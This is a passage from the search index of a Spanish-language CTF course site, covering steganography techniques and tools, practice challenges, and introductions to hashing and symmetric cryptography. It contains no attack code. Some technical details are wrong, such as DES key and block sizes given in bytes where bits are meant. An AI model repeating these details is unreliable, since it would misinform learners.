consejos y estrategias para casos no listados en este apunte.\u003c/p\u003e\n\u003ch2 id=\"stego-en-texto\"\u003eStego en Texto\u003c/h2\u003e\n\u003cp\u003eLa esteganografía en texto consiste en esconder información dentro de un archivo de texto plano. Debido al tamaño de los archivos de texto en general, no es posible esconder mucha información extra en ellos.\u003c/p\u003e\n\u003ch3 id=\"ejemplos-de-técnicas\"\u003eEjemplos de técnicas\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eEspacios y tabs Extra\u003c/strong\u003e: Es posible esconder mensajes combinando tabs y espacios al final de cada línea del mensaje. Una forma de hacer esto sería considerar que los espacios son 0s y los tabs son 1s, codificando un mensaje en binario no detectable a simple vista. En este caso, sería necesario hacer un programa personalizado que procesara el texto.\n\u003cul\u003e\n\u003cli\u003eUn ejemplo de aplicación que automatiza esto es \u003ca href=\"https://wiki.bi0s.in/steganography/stegsnow/\"\u003e\u003cstrong\u003eStegSnow\u003c/strong\u003e\u003c/a\u003e, la cual permite esconder mensajes de texto al final de líneas de otros mensajes de texto.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eZero-Width Joiner y Zero-Width Non-Joiner\u003c/strong\u003e: Dos caracteres especiales de unicode usados en el idioma Persa, los cuales no se notan visualmente pero podrían ser usados para codificar 0s y 1s, al igual que en el ejemplo anterior.\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder\"\u003e\u003cstrong\u003eCaracteres Unicode\u003c/strong\u003e\u003c/a\u003e: Esta página permite esconder y extraer mensajes en un archivo de texto, usando tres técnicas distintas:\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCaracteres invisibles\u003c/strong\u003e: Escondidos al final del texto o entre espacios de palabras, corresponde a un rango de 128 caracteres Unicode que no se muestran pero cuentan como tales. Estos caracteres codifican un mensaje ASCII con sus últimos bytes.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCaracteres Homoglifos\u003c/strong\u003e: Corresponden a caracteres Unicode muy parecidos visualmente a los caracteres del mensaje contenedor, pero que sin embargo equivalen a un código Unicode completamente distinto.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003cem\u003eButt Ugly Latin Wide\u003c/em\u003e\u003c/strong\u003e: Similar al caso anterior, pero usando un conjunto más grande de caracteres homoglifos, los cuales no se parecen completamente a los caracteres reemplazados, pero mantienen la legibilidad. Esta técnica hace parecer al mensaje contenedor como una \u0026ldquo;nota de secuestro\u0026rdquo;.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"herramientas\"\u003eHerramientas\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://gchq.github.io/CyberChef/\"\u003eCyberChef\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003eEn la ventana del texto de entrada, aparece la cantidad de caracteres y líneas. Revisar si cantidad reportada es igual a la cantidad visible.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recomendaciones-para-detectarlo\"\u003eRecomendaciones para detectarlo\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eRevisar largo del texto y compararlo con largo visible\u003c/strong\u003e: Ya sea con Cyberchef, con un editor de texto normal, con un script o a mano, revisar el largo del texto entregado y buscar caracteres invisibles en él. En caso de existir, muy probablemente hay un mensaje escondido usando esteganografía.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"stego-en-audio\"\u003eStego en audio\u003c/h2\u003e\n\u003cp\u003eOtro tipo de problemas esteganográficos esconden mensajes en archivos de audio (WAV, MP3, WMA, etc.). Acá mostraremos algunas técnicas que se suelen usar para esconder mensajes en ellos.\u003c/p\u003e\n\u003ch3 id=\"ejemplos-de-técnicas-1\"\u003eEjemplos de técnicas\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eImágenes en espectrograma de frecuencia\u003c/strong\u003e: Existen programas que permiten esconder imágenes en el espectrograma de frecuencia de un audio existente. Las modificaciones en sonido del audio original no suelen ser muy notorias, en gran parte porque éstas se hacen sobre el umbral del sonido oíble por la mayoría de las personas.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMensajes distintos en múltiples canales de audio\u003c/strong\u003e: Es posible que cada canal de audio tenga información distinta. A veces es necesario amplificar el canal o aplicarle filtros de audio para extraer la información.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMetadatos\u003c/strong\u003e: Es posible esconder información en los datos ID3 de un archivo de sonido. Estos datos suelen ser usados por los reproductores de sonido para contextualizar la canción (artista, álbum, portada, etc).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTransmisión de datos por audio (Modem, programas)\u003c/strong\u003e: A veces el audio suena muy aleatorio como para ser música o voz. En estos casos, es posible que corresponda a una codificación en sonido de un programa o documento.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eUso de programas conocidos para esconder información\u003c/strong\u003e: Programas como \u003ccode\u003esteghide\u003c/code\u003e permiten esconder y extraer información de una imagen, contando con una contraseña.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"herramientas-1\"\u003eHerramientas\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://sonicvisualiser.org/\"\u003e\u003cstrong\u003eSonic Visualizer\u003c/strong\u003e\u003c/a\u003e: Herramienta que permite anotar, analizar y visualizar archivos de audio. Útil en algunos problemas de esteganografía de CTF.\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.audacityteam.org/\"\u003e\u003cstrong\u003eAudacity\u003c/strong\u003e\u003c/a\u003e: Editor de audio de código abierto que permite aislar pistas, editarlas, amplificarlas, entre otras utilidades.\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://gchq.github.io/CyberChef/#recipe=Extract_ID3()\"\u003e\u003cstrong\u003eCyberChef\u003c/strong\u003e\u003c/a\u003e: En específico, la herramienta de revisión de etiquetas ID3.\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"http://steghide.sourceforge.net/\"\u003e\u003cstrong\u003eSteghide\u003c/strong\u003e\u003c/a\u003e: Programa incluido en Kali Linux que permite esconder datos en imágenes y audios, extraíbles con una contraseña.\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"http://wav-prg.sourceforge.net/screenshots.html\"\u003e\u003cstrong\u003eAudiotap y WAV-PRG\u003c/strong\u003e\u003c/a\u003e Transforman audios WAV En archivos ejecutables de Commodore 64.\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://sox.sourceforge.net\"\u003e\u003cstrong\u003eSoX\u003c/strong\u003e\u003c/a\u003e: Heramienta que permite convertir archivos de audio en otros formatos. Entre ellos, convierte un audio en un espectrograma de forma fácil.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recomendaciones-para-detectarlo-1\"\u003eRecomendaciones para detectarlo\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eEscuchar audio detenidamente\u003c/strong\u003e: Ojalá cada canal de forma distinta y por separado.  Cualquier sonido extraño en un canal puede servir como indicio de la existencia de información oculta.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRevisar si el audio parece contener datos\u003c/strong\u003e: Cuando el audio es molesto de escuchar y bastante aleatorio, es posible que integre la codificación de un mensaje en algún formato especial, como por ejemplo modem o un programa de computador antiguo que usa cassettes para guardar datos.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"stego-en-imágenes\"\u003eStego en imágenes\u003c/h2\u003e\n\u003cp\u003eOcultar datos en imágenes es una de las técnicas más comunes de los problemas de esteganografía.\u003c/p\u003e\n\u003cp\u003eEn el caso de imágenes rasterizadas, en general es posible encontrar que cada pixel de ella corresponde a una tupla de hasta 4 valores: $(R,G,B,A)$, donde $R$ (Rojo), $G$ (Verde), $B$ (Azul) y $A$ (Alpha o Transparencia) corresponden a enteros sin signo de 8 bits.\u003c/p\u003e\n\u003ch3 id=\"ejemplos-de-técnicas-2\"\u003eEjemplos de técnicas\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eDatos escondidos en canales de color específicos (R, G, B, A)\u003c/strong\u003e: Al revisar canal de color por separado una imágen, a veces es posible notar mensajes ocultos con información (flags, pistas, etc).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDatos escondidos en bytes de menor importancia\u003c/strong\u003e: Otras veces, se modifican los valores en bytes menos significantes de cada color para esconder un mensaje. Esto altera visiblemente muy poco el color con respecto a una imagen original, permitiendo luego recuperar un archivo binario arbitrario.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eUso de programas conocidos para esconder información\u003c/strong\u003e: Programas como \u003ccode\u003esteghide\u003c/code\u003e permiten esconder y extraer información de una imagen, contando con una contraseña.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMetadatos\u003c/strong\u003e: Es posible esconder información en los datos EXIF de una imagen. Estos datos suelen ser usados por las cámaras para contextualizar la foto tomada (día, hora, configuración del lente, ubicación geográfica, etc).\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"herramientas-2\"\u003eHerramientas\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"http://steghide.sourceforge.net/\"\u003e\u003cstrong\u003eSteghide\u003c/strong\u003e\u003c/a\u003e: Programa incluido en Kali Linux que permite esconder datos en imágenes y audios, extraíbles con una contraseña.\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/Giotino/stegsolve\"\u003e\u003cstrong\u003eStegsolve\u003c/strong\u003e\u003c/a\u003e Programa que permite aplicar filtros a imágenes con el objetivo de extraer información de ellas.\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://gchq.github.io/CyberChef\"\u003e\u003cstrong\u003eCyberchef\u003c/strong\u003e\u003c/a\u003e: Cyberchef cuenta con hartos filtros para procesar y revisar imágenes.\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://stegonline.georgeom.net/checklist\"\u003e\u003cstrong\u003eStegonline\u003c/strong\u003e\u003c/a\u003e: Herramienta con opciones similares a stegsolve, además de un checklist para CTFs.\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/RickdeJager/stegseek\"\u003e\u003cstrong\u003eStegseek\u003c/strong\u003e\u003c/a\u003e: Permite ejecutar ataques de fuerza bruta sobre un archivo que contiene información extraíble por \u003ccode\u003eSteghide\u003c/code\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recomendaciones-para-detectarlo-2\"\u003eRecomendaciones para detectarlo\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eRevisar detalles en imágenes\u003c/strong\u003e: A veces es posible notar detalles gráficos en imágenes. Estos detalles podrían indicar la existencia de un mensaje escondido con esteganografía.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"stego-en-archivos-varios\"\u003eStego en archivos varios\u003c/h2\u003e\n\u003cp\u003eLas siguientes técnicas de esteganografía aplican a casi cualquier tipo de archivo.\u003c/p\u003e\n\u003ch3 id=\"ejemplos-de-técnicas-3\"\u003eEjemplos de técnicas\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eDatos extra al inicio, medio o final del archivo\u003c/strong\u003e: A veces se incluyen datos en bruto entre medio de un archivo, cuidando que a pesar del agregado, el archivo siga siendo utilizable o reproducible. En estos casos, conviene revisar el archivo byte a byte, buscando mensajes en texto plano o codificados (Base64, hexadecimal, etc). También es posible buscar dentro del archivo parte de una flag que ya se conozca (como el inicio, que en general es invariable).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eOtros archivos pegados al final del archivo visible\u003c/strong\u003e: Otras veces se suele pegar un archivo al final de otro archivo reproducible (muchas veces, un archivo comprimido), lo cual no altera el funcionamiento del archivo original.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"herramientas-3\"\u003eHerramientas\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eBinwalk\u003c/strong\u003e: Utilidad integrada en Kali Linux que permite revisar un archivo completo, buscando por signos de otros archivos \u0026ldquo;pegados\u0026rdquo; al final del archivo visible. Posee flags que permiten extraer los archivos pegados de forma directa.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eGNU \u003ccode\u003estrings\u003c/code\u003e\u003c/strong\u003e: Utilidad integrada con casi todos los sistemas operativos Unix que permite extraer solamente los bytes que representan cadenas de texto de un archivo binario.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recomendaciones-para-detectarlo-3\"\u003eRecomendaciones para detectarlo\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eRevisar tamaño de archivos\u003c/strong\u003e: Si el tamaño de los archivos es muy grande para el que debiesen tener, es muy posible que haya información escondida esteganográficamente.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCuidado con los falsos positivos\u003c/strong\u003e: A veces \u003ccode\u003ebinwalk\u003c/code\u003e reporta archivos incrustados que en realidad no existen. Esto suele pasar harto en binarios grandes (en los cuales la probabilidad de un falso positivo aumenta) y en archivos de imágenes PNG (cuyos datos internos coinciden con firmas de otros archivos).\u003c/li\u003e\n\u003c/ul\u003e\n"},{id:6,href:"/docs/stego/ejercicios/",title:"Ejercicios de Stego",description:null,content:"\u003ch2 id=\"stego\"\u003eStego\u003c/h2\u003e\n\u003ch3 id=\"hackthebox\"\u003eHackTheBox\u003c/h3\u003e\n\u003ch4 id=\"retirados\"\u003eRetirados\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://app.hackthebox.eu/challenges/23\"\u003eMilkshake\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://app.hackthebox.eu/challenges/133\"\u003eSecret of a Queen\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"activos\"\u003eActivos\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://app.hackthebox.eu/challenges/22\"\u003e\u003cstrong\u003eClassic, yet complicated\u003c/strong\u003e (Hack The Box)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://app.hackthebox.eu/challenges/191\"\u003e\u003cstrong\u003exorxorxor\u003c/strong\u003e (Hack The Box)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"tryhackme\"\u003eTryHackMe\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://tryhackme.com/room/ctfcollectionvol1\"\u003eCTF Collection 1\u003c/a\u003e (no todos todavía)\u003c/li\u003e\n\u003c/ul\u003e\n"},{id:7,href:"/docs/cripto-moderna/",title:"Criptografía moderna",description:"Criptografía simétrica, asimétrica, hashing y firmas",content:""},{id:8,href:"/docs/cripto-moderna/intro/",title:"Intro a Criptografía Moderna",description:null,content:"\u003ch2 id=\"motivación\"\u003eMotivación\u003c/h2\u003e\n\u003cp\u003eDebido tanto al \u003cem\u003etecnooptimismo\u003c/em\u003e de sus creadores como a las limitaciones tecnológicas de la época, la Internet se pensó inicialmente como una red pública, en la que potencialmente cualquier par de computadores pudiese comunicarse de forma fácil y directa, sin importar en qué lugar geográfico se encontrasen o si compartían proveedor de Internet. Eran tiempos más simples, en los que la información que fluía por ahí no era necesariamente muy importante, o al menos la gente que podía ser capaz de interceptarla y leerla era muy poca.\u003c/p\u003e\n\u003cp\u003eSin embargo, a medida ha aumentado la cantidad de usuarios de la Internet y la cantidad de cosas que se puede hacer en ella, y a medida cada vez más gobiernos, delincuentes informáticos y grandes empresas quieren saber qué estas haciendo en cada momento, se ha vuelto indispensable contar con la capacidad de poder decidir quién puede y quién no puede acceder a ciertas comunicaciones que ocurren en estos espacios. Por ejemplo, hoy resultaría completamente inaceptable pensar que los números de la tarjeta de crédito que usas para pagar Netflix pudiesen ser vistos por cualquier persona o máquina que resulte estar por ahí cuando envías tu formulario.\u003c/p\u003e\n\u003cp\u003ePara lograr el objetivo anterior contamos con una herramienta matemática muy útil: la criptografía. El principio es sencillo. La información se \u003cem\u003ecifra\u003c/em\u003e antes de enviar por el canal público, de modo que el receptor pueda \u003cem\u003edescifrarla\u003c/em\u003e usando información privada y que es de común acuerdo con el emisor del mensaje.\u003c/p\u003e\n\u003cp\u003eSi bien los avances criptográficos de los últimos años entregan un nivel alto de protección \u003cem\u003een teoría\u003c/em\u003e, \u003cem\u003een la práctica\u003c/em\u003e suelen haber errores de implementación graves que podrían permitir exfiltrar la información sensible. De estos errores se aprovechan entidades que desean descifrar mensajes sin autorización, obteniendo así la información sensible que buscan, y muchas veces sin que las partes que se comunicaban por el canal se enteren de esta intrusión.\u003c/p\u003e\n\u003cp\u003eEn el contexto de los \u003cstrong\u003eCTFs\u003c/strong\u003e, la resolución de problemas de criptografía moderna suele requerir conocer las primitivas criptográficas utilizadas y algunos conceptos matemáticos que las sustentan. Si bien en general esto le entrega una dificultad particular a esta categoría de problemas al no existir herramientas que automaticen su resolución, también los vuelve más interesantes y suelen contar con un mayor puntaje en comparación a otros problemas.\u003c/p\u003e\n\u003cp\u003eEn la unidad anterior hablamos un poco de la \u0026ldquo;criptografía clásica\u0026rdquo;, la cual suele trabajar con mensajes alfabéticos simples y suele ser muy fácil de romper con ayuda de un computador y algunos algoritmos bastante simples de implementar. La criptografía moderna limita los ataques vistos en el caso de la criptografía clásica, aprovechándose la existencia de problemas matemáticos muy difíciles de resolver \u003cem\u003ea la mala\u003c/em\u003e, en algunos casos incluso con una gran capacidad de cómputo.\u003c/p\u003e\n\u003cp\u003eComo este curso no intenta ser extensivo ni formal en lo que a criptografía se refiere, nos enfocaremos en tres puntos principales: Criptografía simétrica, criptografía asimétrica y \u003cem\u003ehashing\u003c/em\u003e. En el caso de las dos primeras áreas, veremos tanto algoritmos para mantener su confidencialidad y demostrar su autenticidad, mientras que en la tercera área nos enfocaremos en los algoritmos utilizados para la validación de contraseñas en sistemas informáticos.\u003c/p\u003e\n\u003ch2 id=\"bibliografía-útil\"\u003eBibliografía útil\u003c/h2\u003e\n\u003cp\u003eGran parte de las explicaciones teóricas de esta unidad se basan en las del libro \u003cstrong\u003eSerious Cryptography\u003c/strong\u003e de Jean-Phillipe Aumasson. Por lo que si necesitan más información, pueden revisarlo.\u003c/p\u003e\n\u003cp\u003eTambién pueden utilizar el libro \u003cstrong\u003ePractical Cryptography in Python\u003c/strong\u003e como apoyo para la parte de programacion.\u003c/p\u003e\n"},{id:9,href:"/docs/cripto-moderna/hashing/",title:"Hashing",description:null,content:"\u003cp\u003eLas funciones de \u003cem\u003ehash\u003c/em\u003e son utilizadas como un bloque fundamental en muchos otros componentes criptográficos, tales como firmas digitales, cifrado de llave pública, verificación de integridad de archivos, autentificación de mensajes, contraseñas, entre otros.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../hash.jpg\" alt=\"Función de hash\"\u003e\u003c/p\u003e\n\u003cp\u003eComo muestra la imagen anterior (del libro \u003cem\u003eSerious Cryptography\u003c/em\u003e), una función de hash recibe un mensaje de longitud arbitraria, y devuelve un valor de tamaño fijo (generalmente entre 256 y 512 bits). Al mismo tiempo, una \u0026ldquo;buena función de hash\u0026rdquo; para usos criptográficos es una función que cumple las siguientes características:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eUn cambio chico en el mensaje provoca un cambio muy grande en el valor devuelto por la función de hash.\u003c/li\u003e\n\u003cli\u003eDado un valor devuelto por la función de hash a partir de un mensaje $M$, es demasiado dificil encontrar un valor que produzca ese valor sin conocer $M$.\u003c/li\u003e\n\u003cli\u003eSi bien es obvio que existen colisiones (es decir, dos mensajes distintos entre sí $M_1$ y $M_2$ tales que $H(M_1) == H(M_2)$), encontrar dos mensajes que colisionen debe ser demasiado difícil.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"ejemplos-de-funciones-de-hash\"\u003eEjemplos de Funciones de hash\u003c/h2\u003e\n\u003cp\u003eA continuación se nombrarán algunas funciones de hash usadas ampliamente\u003c/p\u003e\n\u003ch3 id=\"md5\"\u003eMD5\u003c/h3\u003e\n\u003cp\u003eMD5 es un algoritmo de hashing basado en una \u003ca href=\"https://en.wikipedia.org/wiki/Merkle%E2%80%93Damg%C3%A5rd_construction\"\u003econstrucción Merkle-Damgård\u003c/a\u003e que produce un valor de 128 bits, usando bloques de 512 bits en sus procedimientos internos. Este algoritmo fue creado el año 1992, y ya el 1996 se conocían problemas en él. El año 2004 un grupo de investigadores mostró que MD5 no es resistente a colisiones, además de publicar un método práctico para crear datos con el mismo hash pero distinto contenido (ataques de colisión), lo que hizo que se deprecara como hash seguro. Más información sobre la función de hash se puede encontrar en \u003ca href=\"https://en.wikipedia.org/wiki/MD5\"\u003eWikipedia\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eAtaques conocidos\u003c/strong\u003e: \u003ca href=\"https://en.wikipedia.org/wiki/Length_extension_attack\"\u003eAtaque de exensión de longitud (a partir de su construcción)\u003c/a\u003e,  \u003ca href=\"https://en.wikipedia.org/wiki/Collision_attack\"\u003eAtaques de Colisión\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"sha-1\"\u003eSHA-1\u003c/h3\u003e\n\u003cp\u003eSHA-1 es una función criptográfica creada el año 1995 y basada al igual que MD5 en una construcción Merkle-Damgård. Esta función produce un valor de salida 160 bits. El año 2011 fue deprecada por el NIST por problemas similares a los encontrados en MD5. Hoy en día, los ataques de prefijo elegido en SHA1 son prácticos. Más información y descripción de ataques en \u003ca href=\"https://en.wikipedia.org/wiki/SHA-1\"\u003eWikipedia\u003c/a\u003e. Al año actual (2021), es factible para una organización con hartos recursos económicos (cientos de miles de dólares) ejecutar un ataque de colisión de hashes.\u003c/p\u003e\n\u003ch3 id=\"sha-2\"\u003eSHA-2\u003c/h3\u003e\n\u003cp\u003eSHA-2 es una función criptográfica creada el año 2001 por la NSA. Usa la misma primitiva que MD5 y SHA-1 (Merkle-Damgård) pero posee seis variaciones distintas de largo de salida: SHA-224, SHA-256, SHA-384, SHA-512, SHA-512/224 y SHA-512-256. Al momento, no se conocen ataques prácticos a este hash. Más información se puede obtener en \u003ca href=\"https://en.wikipedia.org/wiki/SHA-2\"\u003eWikipedia\u003c/a\u003e.\u003c/p\u003e\n\u003ch3 id=\"sha-3\"\u003eSHA-3\u003c/h3\u003e\n\u003cp\u003eSHA-3 es una función criptográfica creada el año 2015 por el NIST. Es internamente diferente a las funciones ya mencionadas porque utiliza una \u003ca href=\"https://en.wikipedia.org/wiki/Sponge_function\"\u003econstrucción de esponja\u003c/a\u003e. Su existencia y estandarización permite que en caso que a futuro se encuentren problemas en la primitiva de SHA-2 (todavía considerada segura), exista una alternativa de uso de fácil modificación que no debiese ser afectada por este problema.\u003c/p\u003e\n\u003ch3 id=\"funciones-de-derivación-de-llaves-kdf\"\u003eFunciones de derivación de llaves (KDF)\u003c/h3\u003e\n\u003cp\u003eEs una categoría de funciones de hash que deriva una o más llaves secretas a partir de una llave principal, usando una función pseudoaleatoria. Estas funciones suelen tener la característica de que sus valores de salida son lentos de verificar (del orden de segundos) debido a que la cantidad de veces que se ejecutan es configurable\u0026quot;, lo que mitiga el riesgo de un ataque de fuerza bruta para detectar la preimagen de un valor dado. La capacidad de configurar las iteraciones también prepara a la función para el futuro, de forma de poder subir este número arbitrariamente a medida las capacidades de los computadores aumentan.\u003c/p\u003e\n\u003cp\u003eOtra medida de mitigación de estas funciones es que requieren para funcionar un valor extra no secreto denominado \u003cstrong\u003esalt\u003c/strong\u003e. El valor \u003cstrong\u003esalt\u003c/strong\u003e es aleatorio y se usa para la generación y verificación del hash con una función KDF. De esta forma, se limita el riesgo de amenazas tales como \u003ca href=\"https://en.wikipedia.org/wiki/Rainbow_table\"\u003erainbow tables\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eA continuación se mencionan algunas funciones de tipo KDF:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/PBKDF2\"\u003ePBKDF1 y PBKDF2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Argon2\"\u003eArgon2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n"},{id:10,href:"/docs/cripto-moderna/cripto-simetrica/",title:"Criptografía Simétrica",description:null,content:"\u003cp\u003eEn esta sección hablaremos de tres tipos de cifrado: \u003cstrong\u003eOne-time pad\u003c/strong\u003e, \u003cstrong\u003ecifradores de bloque\u003c/strong\u003e y \u003cstrong\u003ecifradores de flujo\u003c/strong\u003e.\u003c/p\u003e\n\u003ch2 id=\"one-time-pad\"\u003eOne-Time Pad\u003c/h2\u003e\n\u003cp\u003eCorresponde a una técnica de cifrado que no puede ser rota si la llave no se reusa, en la cual un mensaje se cifra ejecutando la operación \u003ccode\u003exor\u003c/code\u003e entre un valor aleatorio al menos del tamaño del mensaje y el mismo mensaje. Lamentablemente, este tipo de cifrado no es muy práctico, debido a la dificultad de conseguir una fuente de valores realmente aleatorios que pueda al mismo tiempo estar sincronizada entre las partes que desean comunicarse.\u003c/p\u003e\n\u003ch2 id=\"cifradores-de-bloque\"\u003eCifradores de bloque\u003c/h2\u003e\n\u003cp\u003eLos cifadores de bloque permiten cifrar mensajes de un tamaño fijo (\u003cem\u003econocido como $BlockSize$\u003c/em\u003e) utilizando una llave de con otro tamaño fijo (\u003cem\u003econocido como $KeySize$\u003c/em\u003e). Si el mensaje es más largo que la llave, es necesario dividirlo en \u003cstrong\u003ebloques\u003c/strong\u003e del tamaño adecuado y usar un \u003cstrong\u003emodo de operación\u003c/strong\u003e que permita encadenar estos bloques.\u003c/p\u003e\n\u003cp\u003eEl principio básico del proceso de Cifrado $E$ del cifrador de bloque consiste en ejecutar varias rondas de permutación y sustitución definidas sobre el bloque de texto plano $P$, de tal forma de obtener un nuevo bloque cifrado $C$. Las permutaciones y sustituciones son definidas por una llave $K$, la cual es entregada al cifrador de bloque como entrada, además de $C$. Para descifrar un bloque $C$ (proceso de descifrado $D$), se ejecutan operaciones inversas a las de $E$. Lo anterior se puede observar en la imagen siguiente, obtenida del libro \u003cstrong\u003eSerious Cryptography\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../cifrado.jpg\" alt=\"Esquema abstracto de los procesos de cifrado y descifrado\"\u003e\u003c/p\u003e\n\u003cp\u003eUna característica importante para un buen cifrador, es que la salida $C$ no permita derivar nada ni de $K$ ni de $P$. Para esto, las salidas $C$ deben verse como datos aleatorios (es decir, no tener patrones).\u003c/p\u003e\n\u003cp\u003eEl tamaño de la llave es importante para evitar ataques de fuerza bruta sobre el cifrador. Si la llave es pequeña no es una tarea imposible probar descifrar un bloque cifrado con todas las llaves posibles. Una llave de 16 bits requeriría del orden de 65 mil intentos para recorrer el espacio completo de llaves, mientras que una de 32 bits necesitaría 4 mil millones de intentos. Hoy en día es considerada segura una llave de largo 128 o más.\u003c/p\u003e\n\u003ch3 id=\"tipos-de-cifradores-de-bloque\"\u003eTipos de cifradores de bloque\u003c/h3\u003e\n\u003cp\u003eExisten muchos diseños de cifradores de bloque. A continuación mencionaremos algunos de los más conocidos y usados.\u003c/p\u003e\n\u003ch4 id=\"des\"\u003eDES\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"../des.png\" alt=\"Diagrama de especificación de DES\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eEstandarizado\u003c/strong\u003e en el año 1977\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eLargo de llave:\u003c/strong\u003e 56 bytes (+ 8 de paridad)\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eLargo de bloque:\u003c/strong\u003e 64 bytes\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eRondas:\u003c/strong\u003e 16\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eData Encryption Standard\u003c/strong\u003e es un algoritmo de cifrado simétrico creado por IBM en los 70s. Se publicó como estándar el año 1977, con el tamaño de llave que conocemos. Este tamaño de llave hace que sea completamente factible un ataque de fuerza bruta en unos días, contando con la capacidad computacional adecuada o pagando por un servicio especializado.\u003c/p\u003e\n\u003cp\u003ePueden encontrar una descripción bastante extensiva del algoritmo \u003ca href=\"https://en.wikipedia.org/wiki/Data_Encryption_Standard\"\u003een Wikipedia\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eExiste una versión \u0026ldquo;fortificada\u0026rdquo; denominada \u003cstrong\u003e3DES\u003c/strong\u003e en la cual se aplica 3 veces el algoritmo DES a cada bloque, utilizando hasta 3 llaves ($K_1, K_2, K_3$) de 56 bits distintas, de la siguiente forma:\u003c/p\u003e\n\u003cp\u003e$$C = E_{K_3}(D_{K_2}(E_{K_1}(P)))$$\n$$P = D_{K_1}(E_{K_2}(D_{K_3}(C)))$$\u003c/p\u003e\n\u003cp\u003eSin embargo, esta versión es considerada insegura por el NIST desde el año 2017 debido a la existencia de ataques de colisión, como SWEET32. Más información sobre esta versión pueden encontrarla en \u003ca href=\"https://en.wikipedia.org/wiki/Triple_DES\"\u003ela página de Wikipedia\u003c/a\u003e\u003c/p\u003e\n\u003ch4 id=\"aes\"\u003eAES\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"../aes_rounds.jpg\" alt=\"Rondas 